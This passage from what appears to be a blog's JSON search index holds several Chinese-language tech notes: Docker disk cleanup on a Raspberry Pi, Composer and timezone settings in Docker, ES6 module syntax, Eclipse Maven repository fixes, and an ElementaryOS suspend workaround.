rel=\"noopener\">前言 · 轻松搞定RabbitMQ · 看云</a></p>\n<p><a href=\"https://monitor.dockerflow.com/auto-scaling/\" target=\"_blank\" rel=\"noopener\">Auto-Scaling Services Using Instrumented Metrics - Docker Flow Monitor</a></p>\n<p><a href=\"https://programming.vip/docs/spring-boot-rabbitmq-priority-queue.html\" target=\"_blank\" rel=\"noopener\">Spring Boot RabbitMQ - priority queue</a></p>\n","categories":["Docker"],"tags":["docker","rabbitmq"]},{"title":"Docker 使用容量撐爆 Raspberry PI 硬碟空間","url":"/blog/2020/11/25/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/","content":"<p>使用 Docker 我們知道rm container 所有東西不會被保留<br>但我往往會忽略有 images 占空間<br>我發現 PI 1 已經吃 14GB (總共空間 15GB)<br>後來發現是裝太多 images<br>原因是我往往先丟 PI 1 測試能不能跑<br>日積月累爆掉<br>PS: 是更新 apt upgrade 才發現   哈哈</p>\n<a id=\"more\"></a>\n<h2 id=\"尋找所占目錄空間方法\"><a href=\"#尋找所占目錄空間方法\" class=\"headerlink\" title=\"尋找所占目錄空間方法\"></a>尋找所占目錄空間方法</h2><p>參考: <a href=\"http://blog.ilc.edu.tw/blog/index.php?op=printView&amp;articleId=581867&amp;blogId=25793\" target=\"_blank\" rel=\"noopener\">Linux - 找出佔用磁碟空間最大的目錄/檔案</a></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">du -hsx /home/* | sort -hr | head</span><br></pre></td></tr></table></figure>\n<p>這個好處能找到外面層所占目錄<br>可以慢慢跑裡面哪一個資料夾吃大空間</p>\n<p>最後改成當下執行目錄前大空間大小</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">du -hsx ./* | sort -hr | head</span><br></pre></td></tr></table></figure>\n<p>找到 docker</p>\n<p>其實 df 就能看到是 /lib/docker/overlay/…</p>\n<h2 id=\"docker-清除空間\"><a href=\"#docker-清除空間\" class=\"headerlink\" title=\"docker 清除空間\"></a>docker 清除空間</h2><p>以下參考整理</p>\n<ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/36956285\" target=\"_blank\" rel=\"noopener\">Docker:我們的硬盤空間去哪了？ - 知乎</a></li>\n<li><a href=\"https://developer.aliyun.com/article/272173\" target=\"_blank\" rel=\"noopener\">Docker 空間使用分析與清理-阿里雲開發者社區</a></li>\n<li><a href=\"https://blog.fundebug.com/2018/01/10/how-to-clean-docker-disk/\" target=\"_blank\" rel=\"noopener\">如何清理Docker占用的磁盘空间? | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现</a></li>\n</ul>\n<h3 id=\"確認所占空間\"><a href=\"#確認所占空間\" class=\"headerlink\" title=\"確認所占空間\"></a>確認所占空間</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker system df</span><br><span class=\"line\"></span><br><span class=\"line\">Images              22                  6                   4.827GB             3.517GB (72%)</span><br><span class=\"line\">Containers          6                   4                   93.54MB             8.661MB (9%)</span><br><span class=\"line\">Local Volumes       3                   1                   214.6kB             66.34kB (30%)</span><br><span class=\"line\">Build Cache         0                   0                   0B                  0B</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 詳細資訊</span></span><br><span class=\"line\">docker system df -v</span><br><span class=\"line\"><span class=\"comment\"># 可以看更詳細資訊...</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"手動清除\"><a href=\"#手動清除\" class=\"headerlink\" title=\"手動清除\"></a>手動清除</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 刪除所有關閉的容器</span></span><br><span class=\"line\"></span><br><span class=\"line\">docker ps -a | grep Exit | cut -d <span class=\"string\">' '</span> -f 1 | xargs docker rm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 刪除所有 dangling 鏡像(即無 tag 的鏡像)：</span></span><br><span class=\"line\"></span><br><span class=\"line\">docker rmi $(docker images | grep <span class=\"string\">\"^&lt;none&gt;\"</span> | awk <span class=\"string\">\"&#123;print <span class=\"variable\">$3</span>&#125;\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 刪除所有 dangling 數據卷(即無用的 volume)：</span></span><br><span class=\"line\"></span><br><span class=\"line\">docker volume rm $(docker volume ls -qf dangling=<span class=\"literal\">true</span>)</span><br></pre></td></tr></table></figure>\n<p>這邊有更快清除方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker system prune</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>   Tips ：</p>\n</blockquote>\n<blockquote>\n<p>   不同狀態的鏡像</p>\n</blockquote>\n<blockquote>\n<pre><code>已使用鏡像（used image）： 指所有已被容器（包括已停止的）關聯的鏡像。即 docker ps -a 看到的所有容器使用的鏡像。\n未引用鏡像（unreferenced image）：沒有被分配或使用在容器中的鏡像，但它有 Tag 信息。\n懸空鏡像（dangling image）：未配置任何 Tag （也就無法被引用）的鏡像，所以懸空。這通常是由於鏡像 build 的時候沒有指定 -t 參數配置 Tag 導致的。比如:\n</code></pre></blockquote>\n<blockquote>\n<p>REPOSITORY                                                   TAG                 IMAGE ID            CREATED             SIZE<br>&lt; none &gt;                                                      <none>              6ad733544a63        5 days ago          1.13 MB   &gt; # 懸空鏡像（dangling image）<br>   掛起的卷（dangling Volume)<br>   類似的，dangling=true 的 Volume 表示沒有被任何容器引用的卷。</none></p>\n</blockquote>\n<p>docker system prune 自動清理說明：</p>\n<p>該指令默認會清除所有如下資源：<br>    已停止的容器（container）<br>    未被任何容器所使用的卷（volume）<br>    未被任何容器所關聯的網絡（network）<br>    所有懸空鏡像（image）。<br>該指令默認只會清除懸空鏡像，未被使用的鏡像不會被刪除。<br>添加 -a 或 –all 參數後，可以一併清除所有未使用的鏡像和懸空鏡像。<br>可以添加 -f 或 –force 參數用以忽略相關告警確認信息。<br>指令結尾處會顯示總計清理釋放的空間大小。</p>\n<p>以上指令沒有清除到空間，但加了 -a 就清除掉了<br><del>可以做 apt upgrade 了</del><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker system prune -a</span><br></pre></td></tr></table></figure></p>\n<p>有空再整理什麼是 懸空鏡像 東西… 跟 docker log 處理</p>\n","categories":["Docker"],"tags":["docker"]},{"title":"Docker 執行專案的 PHP Composer 方法","url":"/blog/2019/11/12/Docker-%E5%9F%B7%E8%A1%8C%E5%B0%88%E6%A1%88%E7%9A%84-PHP-Composer-%E6%96%B9%E6%B3%95/","content":"<p>最近找了一下方法<br>記錄一下</p>\n<a id=\"more\"></a>\n<p>這邊說明一下，最近把公司舊程式 Docker 化<br>再一些程式初始化在想要怎麼用<br><strong>一般不需要這樣做</strong>，再有 CI /CD 情況下可以直接用 dockerfile 去做部屬，程式就不需要做掛載動作<br>由於測試環境是放在 ftp 上面做 volume ，所以我沒有在 docker-compose 在架設初始化自己先做<br>但網路資源很少，還是紀錄一下</p>\n<h2 id=\"docker-compose-方法-1\"><a href=\"#docker-compose-方法-1\" class=\"headerlink\" title=\"docker-compose 方法 1\"></a>docker-compose 方法 1</h2><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3'</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  vvv:</span></span><br><span class=\"line\"><span class=\"attr\">    build:</span> <span class=\"string\">./xxx</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">./ssss:/ooooo</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span> <span class=\"string\">php</span>  <span class=\"string\">xxxx</span></span><br><span class=\"line\"><span class=\"attr\">    depends_on:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">composer</span></span><br><span class=\"line\"><span class=\"attr\">  composer:</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">'no'</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">composer</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span> <span class=\"string\">install</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">./ssss:/ooooo</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"docker-compose-方法-2\"><a href=\"#docker-compose-方法-2\" class=\"headerlink\" title=\"docker-compose 方法 2\"></a>docker-compose 方法 2</h2><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3'</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  vvv:</span></span><br><span class=\"line\"><span class=\"attr\">    build:</span> <span class=\"string\">./xxx</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">./ssss:/ooooo</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span> <span class=\"string\">bash</span> <span class=\"bullet\">-c</span> <span class=\"string\">\"cd &#123;composer_path&#125; &amp;&amp; composer install  &amp;&amp; php  xxxxx\"</span></span><br></pre></td></tr></table></figure>\n","categories":["PHP"],"tags":["php","docker"]},{"title":"Docker 修改時區方法","url":"/blog/2021/06/02/Docker-%E4%BF%AE%E6%94%B9%E6%99%82%E5%8D%80%E6%96%B9%E6%B3%95/","content":"<p>比較常在網路上看到</p>\n<a id=\"more\"></a>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">volumes:</span> </span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"/etc/localtime:/etc/localtime:ro\"</span></span><br></pre></td></tr></table></figure>\n<p>但測試 Java Container發現沒有成功<br>後來使用下面方法就成功了</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">environment:</span> </span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"TZ=Asia/Taipei\"</span></span><br></pre></td></tr></table></figure>\n<p>參考:</p>\n<p><a href=\"https://www.arthurtoday.com/2016/07/how-to-setup-docker-container-timezone-host.html\" target=\"_blank\" rel=\"noopener\">設定 Docker Container 與 Host 相同時區的方法</a></p>\n<p><a href=\"https://hu.mc4.us/post/change-timezone-in-docker/\" target=\"_blank\" rel=\"noopener\">[筆記] 修改 docker 容器內的時區 - Change Timezone in Docker | MC部落</a></p>\n","categories":["Docker"],"tags":["docker"]},{"title":"ECMAScript6 Module使用筆記","url":"/blog/2018/09/22/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/","content":"<p>最近因為學了VueJS，覺得事時候要進入Vue cli環境用用看<br>但知道Vue cli是使用Webpack<br>總覺得不了解JS模組化要怎麼寫<br>之後程式會踩到一堆雷<br>在此先記錄一些筆記</p>\n<a id=\"more\"></a>\n<p>在之前有看過nodejs的<code>require</code>，JavaScript的<code>import xxxx from ooo</code><br>一直以為他們都是大同小意，可能可以互通<br>但今天看到這篇<a href=\"http://imweb.io/topic/582293894067ce9726778be9\" target=\"_blank\" rel=\"noopener\">Node中没搞明白require和import，你会被坑的很惨 - 腾讯Web前端 IMWeb 团队社区 | blog | 团队博客</a><br><a href=\"/blog/2018/09/22/ECMAScript6-Module使用筆記/1.png\" title=\"備份圖\">備份圖</a><br>發現完全不一樣</p>\n<p>由於我對COMMONJS、AMD跟nodejs不熟悉<br>所以我這篇指記錄ECMAScript 6 模組化</p>\n<h2 id=\"模組-導出\"><a href=\"#模組-導出\" class=\"headerlink\" title=\"(模組)導出\"></a>(模組)導出</h2><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">var</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> b;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"number\">1</span>;<span class=\"comment\">//不能放不是變數，只能放function name跟object指定</span></span><br></pre></td></tr></table></figure>\n<p>詳細:<a href=\"https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/export\" target=\"_blank\" rel=\"noopener\">export - JavaScript | MDN</a></p>\n<h3 id=\"export-default\"><a href=\"#export-default\" class=\"headerlink\" title=\"export default\"></a>export default</h3><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 底下的 function 用 class, function* 也可以</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> expression;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">…</span>) </span>&#123; … &#125; </span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">name1</span>(<span class=\"params\">…</span>) </span>&#123; … &#125;</span><br></pre></td></tr></table></figure>\n<p>一個JS只能放一個export default</p>\n<p>在寫模組導入的時候<br>在說明會比較清楚</p>\n<p>基本上export會解析後面放的變數名稱</p>\n<p><code>export {xxxx, oooo,ffff}</code><br>當export放物件(大陸翻:對象，最近看中文一直看不懂這詞XD)</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> &#123; name1 <span class=\"keyword\">as</span> <span class=\"keyword\">default</span>, … &#125;;</span><br><span class=\"line\"><span class=\"keyword\">export</span> * <span class=\"keyword\">from</span> …;</span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123; name1, name2, …, nameN &#125; <span class=\"keyword\">from</span> …;</span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123; import1 <span class=\"keyword\">as</span> name1, import2 <span class=\"keyword\">as</span> name2, …, nameN &#125; <span class=\"keyword\">from</span> …;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>另外要注意的是，如果想 import 的同時 export 出去，<br>並?不會 export 預設輸出。<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">export * from …;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>你必須額外 import 它的預設輸出，然後再用 export<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import mod from &quot;mod&quot;;</span><br><span class=\"line\">export default mod;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<h2 id=\"模組-導入\"><a href=\"#模組-導入\" class=\"headerlink\" title=\"(模組)導入\"></a>(模組)導入</h2><p>如果我們要輸出單獨的 function, object, class 或當做 fallback 值來輸出的話，就可以用預設輸出：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// module \"my-module.js\"</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cube</span>(<span class=\"params\">x</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x * x * x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">var</span> b = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>外部檔案的 import 用法：<br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> cube <span class=\"keyword\">from</span> <span class=\"string\">'my-module'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;b&#125; <span class=\"keyword\">from</span> <span class=\"string\">'my-module'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(cube(<span class=\"number\">3</span>)); <span class=\"comment\">// 27</span></span><br></pre></td></tr></table></figure></p>\n<p>Note 注意預設輸出不能使用 var, let , const。</p>\n<p>比較要注意的事情<br><code>import</code>後面有沒有<code>{}</code>就不一樣了<br><code>{}</code>裡面是放export 變數名稱<br>沒有的話，import xxx，xxx是指default導出的東西</p>\n<h2 id=\"HTML載入\"><a href=\"#HTML載入\" class=\"headerlink\" title=\"HTML載入\"></a>HTML載入</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"module\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"a.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>現在Server都支援了ES6載入模組<br>當然要實驗看看</p>\n<h2 id=\"小小實驗\"><a href=\"#小小實驗\" class=\"headerlink\" title=\"小小實驗\"></a>小小實驗</h2><h3 id=\"HFS踩坑記，無法載入\"><a href=\"#HFS踩坑記，無法載入\" class=\"headerlink\" title=\"HFS踩坑記，無法載入\"></a>HFS踩坑記，無法載入</h3><p>在公司用hfs不能開啟，但用xxamp可以直行<br>但是在家裡hfs又可以用了…</p>\n<h3 id=\"兩個export物件會怎麼樣\"><a href=\"#兩個export物件會怎麼樣\" class=\"headerlink\" title=\"兩個export物件會怎麼樣\"></a>兩個export物件會怎麼樣</h3><p>這是我想的，好奇這樣能不能跑<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">export &#123;xxxx,oooo&#125;</span><br><span class=\"line\">export &#123;zzzz,yyyy&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"b-js\"><a href=\"#b-js\" class=\"headerlink\" title=\"b.js\"></a>b.js</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> &#123;a,b&#125;</span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123;c,d&#125;</span><br><span class=\"line\"><span class=\"comment\">// export &#123;a,c,d&#125;</span></span><br><span class=\"line\"><span class=\"comment\">// SyntaxError: duplicate export name 'a'</span></span><br></pre></td></tr></table></figure>\n<p>詳細下載<a href=\"/blog/2018/09/22/ECMAScript6-Module使用筆記/jsModule.7z\" title=\"我寫的東西\">我寫的東西</a></p>\n<p>題外話<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">export &#123;b&#125;; // 这是ES6的写法，实际上就是&#123;b:b&#125;</span><br></pre></td></tr></table></figure></p>\n<p>原本以為文章寫錯<br>剛好邊看直播<a href=\"https://www.youtube.com/watch?v=aYlihfn-Gmg\" target=\"_blank\" rel=\"noopener\">[ Alex 宅幹嘛 ] 👨‍💻Vue 全家桶與 RESTful API 串接入門介紹 Part 2 - YouTube</a><br>有題到這個是ES6語法 XD</p>\n","categories":["JavaScript"],"tags":["ecmascript6"]},{"title":"Eclipse 處理 Maven 問題","url":"/blog/2021/06/02/Eclipse-%E8%99%95%E7%90%86-Maven-%E5%95%8F%E9%A1%8C/","content":"<p>各種奇怪整裡</p>\n<a id=\"more\"></a>\n<h2 id=\"Failure-to-transfer-org-apache-maven-plugins-maven-compiler-plugin-jar-2-5-1\"><a href=\"#Failure-to-transfer-org-apache-maven-plugins-maven-compiler-plugin-jar-2-5-1\" class=\"headerlink\" title=\"Failure to transfer org.apache.maven.plugins:maven-compiler-plugin:jar:2.5.1\"></a>Failure to transfer org.apache.maven.plugins:maven-compiler-plugin:jar:2.5.1</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[INFO] Scanning for projects...</span><br><span class=\"line\">[WARNING] </span><br><span class=\"line\">[WARNING] Some problems were encountered while building the effective model for wsclient:wsclient:jar:0.0.1-SNAPSHOT</span><br><span class=\"line\">[WARNING] &apos;build.plugins.plugin.version&apos; for org.apache.maven.plugins:maven-resources-plugin is missing. @ line 60, column 21</span><br><span class=\"line\">[WARNING] &apos;build.plugins.plugin.version&apos; for org.apache.maven.plugins:maven-compiler-plugin is missing. @ line 52, column 21</span><br><span class=\"line\">[WARNING] </span><br><span class=\"line\">[WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.</span><br><span class=\"line\">[WARNING] </span><br><span class=\"line\">[WARNING] For this reason, future Maven versions might no longer support building such malformed projects.</span><br><span class=\"line\">[WARNING] </span><br><span class=\"line\">[INFO] </span><br><span class=\"line\">[INFO] Using the builder org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder with a thread count of 1</span><br><span class=\"line\">[INFO]                                                                         </span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br><span class=\"line\">[INFO] Building finvcbusclient Maven Webapp 0.0.1-SNAPSHOT</span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br><span class=\"line\">[INFO] Downloading: http://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/2.6/maven-resources-plugin-2.6.pom</span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>\n<p>發現 <code>http://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/2.6/maven-resources-plugin-2.6.pom</code> 不能下載<br>加https 就可以了…</p>\n<p>後來網路嘗試了各種方法(以下我沒成功，可能是不同狀況)</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/weixin_30580341/article/details/99592631\" target=\"_blank\" rel=\"noopener\">Failure to transfer org.apache.maven.plugins:maven-compiler-plugin:jar:2.5.1_weixin_30580341的博客-CSDN博客</a></li>\n<li><a href=\"https://blog.csdn.net/imlmy/article/details/8268293\" target=\"_blank\" rel=\"noopener\">eclipse加载maven工程提示pom.xml无法解析org.apache.maven.plugins:maven-resources-plugin:2.4.3解决方案_imlmy的专栏-CSDN博客</a></li>\n<li><a href=\"https://dotblogs.com.tw/grayyin/2019/09/17/192207\" target=\"_blank\" rel=\"noopener\">eclipse建立maven錯誤訊息Could not calculate build plan: Plugin org.apache.maven.plugins:maven-war-plugin:2. | 阿輝的零碎筆記 - 點部落</a></li>\n</ul>\n<p>都沒有成功….</p>\n<p>後來發現是 </p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>http://people.apache.org/repo/m2-incubating-repository/<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>不能訪問</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;url&gt;https://repo.maven.apache.org/maven2/&lt;/url&gt;</span><br></pre></td></tr></table></figure>\n<p>修正完還是不行…</p>\n<p>最後加了這個就正常了<br><a href=\"https://stackoverflow.com/questions/31316339/how-to-solve-maven-2-6-resource-plugin-dependency/59872184#59872184\" target=\"_blank\" rel=\"noopener\">java - How to solve maven 2.6 resource plugin dependency? - Stack Overflow</a></p>\n<figure class=\"highlight xml\"><figcaption><span>pom.xml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">repositories</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">repository</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">snapshots</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">enabled</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">enabled</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">snapshots</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>central<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Central Repository<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>https://repo.maven.apache.org/maven2<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">repository</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">repositories</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">pluginRepositories</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">pluginRepository</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">releases</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">updatePolicy</span>&gt;</span>never<span class=\"tag\">&lt;/<span class=\"name\">updatePolicy</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">releases</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">snapshots</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">enabled</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">enabled</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">snapshots</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>central<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Central Repository<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>https://repo.maven.apache.org/maven2<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">pluginRepository</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">pluginRepositories</span>&gt;</span></span><br></pre></td></tr></table></figure>","categories":["Java"],"tags":["eclipse","maven"]},{"title":"ElementaryOS設定停用休眠但還是會休眠問題解決方案","url":"/blog/2019/02/03/ElementaryOS%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8%E4%BC%91%E7%9C%A0%E4%BD%86%E9%82%84%E6%98%AF%E6%9C%83%E4%BC%91%E7%9C%A0%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/","content":"<p>最近重買 SSD 重灌 ElentmaryOS 0.5 版<br>發現設定 睡眠 停用<br>電腦竟然還是會做睡眠<br>起初我以為是設定的問題<br>但我看我設定都關掉了<br>這邊有找到解決方法</p>\n<a id=\"more\"></a>\n<h2 id=\"解決-elementary-os-休眠問題\"><a href=\"#解決-elementary-os-休眠問題\" class=\"headerlink\" title=\"解決 elementary os 休眠問題\"></a>解決 elementary os 休眠問題</h2><p>首先，有在<a href=\"https://royalprogrammer.wordpress.com/2018/01/30/ssd_optimization/\" target=\"_blank\" rel=\"noopener\">elementary OS SSD 最佳化 – 皇家工程師</a>看到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">關閉休眠 (Hibernation)</span><br><span class=\"line\"></span><br><span class=\"line\">elementary OS 的休眠預設是關閉的。</span><br><span class=\"line\"></span><br><span class=\"line\">檢查休眠是否為關閉的方式如下：</span><br><span class=\"line\"></span><br><span class=\"line\">在終端機執行下列指令使用 nano 編輯器打開 /var/lib/polkit-1/localauthority/10-vendor.d/com.ubuntu.desktop.pkla</span><br><span class=\"line\"></span><br><span class=\"line\">sudo nano /var/lib/polkit-1/localauthority/10-vendor.d/com.ubuntu.desktop.pkla</span><br><span class=\"line\"></span><br><span class=\"line\">[Disable hibernate by default in upower] 和 [Disable hibernate by default in logind] 下的 ResultActive 為 No 的話就代表休眠是關閉的。如果是 Yes 的話，可以自己改成 No 關閉休眠。</span><br></pre></td></tr></table></figure>\n<p>目前設定確實跟預設一模一樣<br>不過睡眠(sleep mode)跟休眠(Hibernation)不太一樣<br>可參考<a href=\"https://www.foolegg.com/what-are-the-differences-between-shut-down-standby-sleep-hibernate-and-hybrid-sleep/\" target=\"_blank\" rel=\"noopener\">[教學] 關機、待命、睡眠、休眠和交互式睡眠的分別 | FoolEgg.com</a></p>\n<p>最後找到<a href=\"https://elementaryos.stackexchange.com/questions/16519/elementary-os-ignoring-suspend-disable\" target=\"_blank\" rel=\"noopener\">settings - Elementary OS ignoring suspend disable - elementary OS Stack Exchange</a><br>裡面<a href=\"https://github.com/elementary/switchboard-plug-power/issues/89\" target=\"_blank\" rel=\"noopener\">Never suspend when plugged in setting ignored (always uses battery setting for suspend) · Issue #89 · elementary/switchboard-plug-power</a>有一個 Github Issue<br>裡面還是 open<br>看到有一個 workaround 方式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">    sudo su</span><br><span class=\"line\"></span><br><span class=\"line\">enter, then your password</span><br><span class=\"line\"></span><br><span class=\"line\">    su - -s /bin/bash lightdm</span><br><span class=\"line\"></span><br><span class=\"line\">enter</span><br><span class=\"line\"></span><br><span class=\"line\">    dbus-launch gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type nothing</span><br><span class=\"line\"></span><br><span 